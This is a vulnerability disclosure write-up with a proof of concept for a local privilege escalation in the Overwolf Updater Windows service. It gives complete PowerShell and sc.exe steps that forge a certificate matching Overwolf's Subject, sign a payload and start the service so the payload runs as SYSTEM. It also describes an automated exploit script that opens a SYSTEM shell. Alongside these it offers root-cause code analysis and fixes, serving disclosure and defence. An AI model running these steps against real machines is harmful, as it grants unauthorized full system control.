# Overwolf Updater Service — Local Privilege Escalation to SYSTEM (Overwolf2SYSTEM)

## Summary

The Overwolf Updater Windows service (`OverwolfUpdater`) runs as `LocalSystem` and grants **Everyone** the permission to start it with arbitrary arguments. The `/InstallCR` command accepts a user-controlled file path, performs a signature check that **skips Authenticode verification (WinVerifyTrust)** and only checks the certificate's Subject string, then **executes the file as SYSTEM**. An attacker can sign a malicious binary with a self-signed certificate matching Overwolf's exact Subject DN and achieve arbitrary code execution as `NT AUTHORITY\SYSTEM`.

**Confirmed working** on Overwolf v0.304.0.11, Windows 11.

## Severity

**HIGH** — Local Privilege Escalation (standard user → SYSTEM)

| Attribute | Value |
|-----------|-------|
| Attack Vector | Local |
| Privileges Required | None (standard user) |
| User Interaction | None |
| Impact | Full SYSTEM compromise |
| Affected Users | All Overwolf installations (~30M+ users) |

## Proof of Concept — Confirmed SYSTEM Execution

### PoC Output

```
=== EXPLOIT SUCCESSFUL ===
[Overwolf LPE PoC]
Timestamp: 2-7-2026 00:09:38
Running as: nt authority\system
Process ID: 29248
Arguments: --install
Integrity: System

Privileges:
SeAssignPrimaryTokenPrivilege    Disabled
SeLockMemoryPrivilege            Enabled
SeTcbPrivilege                   Enabled       ← Part of the OS
SeDebugPrivilege                 Enabled       ← Debug any process
SeImpersonatePrivilege           Enabled       ← Impersonate any user
SeCreateGlobalPrivilege          Enabled
[... full SYSTEM privilege set ...]
```

The sample above is from the originally confirmed execution. The current payload version additionally writes a `Steps:` log (token duplication → `SeTcbPrivilege` enable → session retarget → process spawn) into the proof file at every checkpoint for diagnosability, and also opens a visible interactive command prompt running as SYSTEM on the logged-in desktop. How the terminal spawn works: the running-as-SYSTEM service executes in session 0 with no desktop, so the payload duplicates its own LocalSystem token, enables `SeTcbPrivilege` (present but disabled in service tokens, required for retargeting), retargets the duplicate to the active session (`WTSGetActiveConsoleSessionId`, with WTS-active/RDP sessions as fallback), and launches `cmd.exe` on the interactive desktop via `CreateProcessAsUser` with `lpDesktop = "winsta0\default"` — the same mechanism as `PsExec -s -i`.

### Steps to Reproduce

```powershell
# 1. Create self-signed cert with Overwolf's exact Subject DN
$cert = New-SelfSignedCertificate `
    -Subject "CN=Overwolf Ltd, O=Overwolf Ltd, L=Tel-Aviv, S=Israel, C=IL" `
    -Type CodeSigningCert `
    -CertStoreLocation Cert:\CurrentUser\My

# 2. Compile a payload (writes proof of SYSTEM execution)
#    See: payload.cs

# 3. Export cert and sign the payload
$pwd = ConvertTo-SecureString -String "pass" -Force -AsPlainText
Export-PfxCertificate -Cert $cert -FilePath $env:TEMP\ow.pfx -Password $pwd
signtool sign /f $env:TEMP\ow.pfx /p pass /fd sha256 payload.exe

# 4. Verify forged signature matches (simulates Overwolf's check):
$certs = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2Collection
$certs.Import("payload.exe")
$certs[0].Subject  # → "CN=Overwolf Ltd, O=Overwolf Ltd, L=Tel-Aviv, S=Israel, C=IL"

# 5. Trigger the exploit — any standard user can do this:
sc.exe start OverwolfUpdater /InstallCR C:\path\to\payload.exe

# 6. Payload executes as NT AUTHORITY\SYSTEM
```

### Automated Exploit Script

Full exploit script: `exploit.ps1`
- Creates forged cert, compiles payload, signs it, starts service
- Usage: `.\exploit.ps1` (default: spawns a visible interactive terminal on the desktop running as SYSTEM, and writes a proof file to `C:\ProgramData\Overwolf\poc_proof.txt`)
- Custom command: `.\exploit.ps1 -Command "<cmd>"` (runs `<cmd>` inside the spawned SYSTEM prompt, which then stays open)
- The script polls `C:\ProgramData\Overwolf\poc_proof.txt` for the execution proof and only reports success once the payload's step log contains the "cmd.exe spawned as SYSTEM" marker
- Requires: Windows SDK (signtool.exe) and the .NET Framework 4 compiler (csc.exe)

## Root Cause Analysis

### Bug 1: Insecure Service DACL — Everyone Has SERVICE_START

Service security descriptor (SDDL):
```
(A;;RPWPCR;;;WD)
```

| Permission | SDDL | Granted To |
|-----------|------|------------|
| SERVICE_START | RP | WD (Everyone) |
| SERVICE_STOP | WP | WD (Everyone) |
| SERVICE_USER_DEFINED_CONTROL | CR | WD (Everyone) |

Any user on the system can start and stop the LocalSystem service. This ACE appears **multiple times** in the SDDL, suggesting it was set programmatically (possibly by the installer granting each user access individually, but using the Everyone SID).

**Expected**: Only Administrators and the Overwolf client should have SERVICE_START.

### Bug 2: Signature Check Skips Authenticode Verification

`FileUtils.FileSignedByOverwolf()` in `OverWolf.Client.CommonUtils.Utils`:

```csharp
public static bool FileSignedByOverwolf(
    string path,
    bool verifyEmbeddedSignature = false,  // ← DEFAULT: WinVerifyTrust SKIPPED
    bool skipSubjectTest = false,
    bool skipSerialTest = true)            // ← DEFAULT: serial NOT checked
{
    // verifyEmbeddedSignature is false → WinVerifyTrust NEVER CALLED
    if (verifyEmbeddedSignature && !WinTrust.VerifyEmbeddedSignature(path))
        return false;

    // Extract cert from PE's Authenticode signature
    X509Certificate2Collection certs = new X509Certificate2Collection();
    certs.Import(path);

    // Only checks if Subject STRING matches — no cryptographic verification
    foreach (X509Certificate2 cert in certs)
    {
        if (cert.Subject.Contains("Overwolf"))
        {
            // Exact Subject match against 3 hardcoded values
            if (cert.Subject == "CN=Overwolf Ltd, O=Overwolf Ltd, L=Tel-Aviv, S=Israel, C=IL"
             || cert.Subject == "CN=Overwolf Ltd, O=Overwolf Ltd, L=Tel Aviv-Jaffa, S=Israel, C=IL"
             || cert.Subject == "CN=Overwolf Ltd, O=Overwolf Ltd, L=Ramat Gan, C=IL")
            {
                return true;  // ← PASSES with self-signed cert!
            }
        }
    }
    return false;
}
```

**What's checked:**
- Certificate Subject string matches one of 3 exact values ✓

**What's NOT checked:**
- WinVerifyTrust (Authenticode integrity) — **skipped** (`verifyEmbeddedSignature=false`)
- Certificate chain/trust — **not checked** (self-signed accepted)
- Certificate validity/expiration — **not checked**
- Certificate serial number — **skipped** (`skipSerialTest=true`)
- Certificate issuer — **not checked**

**Bypass**: Create a self-signed code-signing certificate with the exact Subject DN. Sign any binary with it. The Subject matches → check passes → binary executes as SYSTEM.

### Bug 3: HandleInstallCR Executes User-Controlled Path

```csharp
private static void HandleInstallCR()
{
    string[] array = m_Arguments.CommandlineArgs ?? ServiceCommandlineArgs;
    string text = array[1];  // Path from sc start arguments

    if (!FileUtils.FileSignedByOverwolf(text))  // Weak check (Bug 2)
    {
        return;
    }

    // EXECUTES AS SYSTEM!
    Process.Start(new ProcessStartInfo
    {
        FileName = text,                      // User-controlled
        Arguments = "--install",
        WindowStyle = ProcessWindowStyle.Hidden
    });
}
```

## Attack Flow

```
Standard user (no admin, no UAC)
  │
  ├─1─► New-SelfSignedCertificate -Subject "CN=Overwolf Ltd, O=Overwolf Ltd, ..."
  ├─2─► signtool sign /f forged.pfx payload.exe
  │
  └─3─► sc start OverwolfUpdater /InstallCR C:\Users\user\payload.exe
          │
          │  Service starts as NT AUTHORITY\SYSTEM
          │
          ├─► OnStart parses /InstallCR → RunCRInstall=true, stores path
          ├─► Service stops itself
          ├─► HandleInstallCR() called
          │     │
          │     ├─► FileSignedByOverwolf("C:\Users\user\payload.exe")
          │     │     ├─► verifyEmbeddedSignature=false → WinVerifyTrust SKIPPED
          │     │     ├─► X509Certificate2Collection.Import() → extracts forged cert
          │     │     ├─► Subject == "CN=Overwolf Ltd, ..." → EXACT MATCH ✓
          │     │     └─► return true
          │     │
          │     └─► Process.Start(payload.exe, "--install")
          │           → EXECUTES AS NT AUTHORITY\SYSTEM
          │
          └─► Attacker has full SYSTEM access
```

## Files

| File | Description |
|------|-------------|
| `exploit.ps1` | Automated exploit script: forges cert, builds + signs payload, starts the service, and verifies the proof/terminal-spawn markers |
| `payload.cs` | Payload source: writes SYSTEM proof file (whoami, privileges, step log) and spawns a visible interactive terminal as SYSTEM |

## Suggested Fix

1. **Fix service DACL**: Remove Everyone's SERVICE_START/STOP/CONTROL permissions. Only Administrators and the Overwolf client process should have these rights.

2. **Enable Authenticode verification**: Call `FileSignedByOverwolf(path, verifyEmbeddedSignature: true)` to invoke WinVerifyTrust and validate the actual signature chain against a trusted CA.

3. **Validate certificate chain**: Verify the signing certificate chains to a trusted root CA (DigiCert, Sectigo, etc.), not just string-match the Subject.

4. **Restrict file paths**: Only allow `/InstallCR` to execute files from Overwolf's own installation directory (`C:\Program Files (x86)\Common Files\Overwolf\`), which standard users cannot write to.

5. **Enable serial number check**: Set `skipSerialTest: false` to validate against the 7 known Overwolf certificate serial numbers.

## Disclosure

- **Vendor**: Overwolf Ltd
- **Affected versions**: 0.304.0.11 (likely all versions with this service architecture)
- **Discovery date**: 2026-07-02
- **Status**: Patched
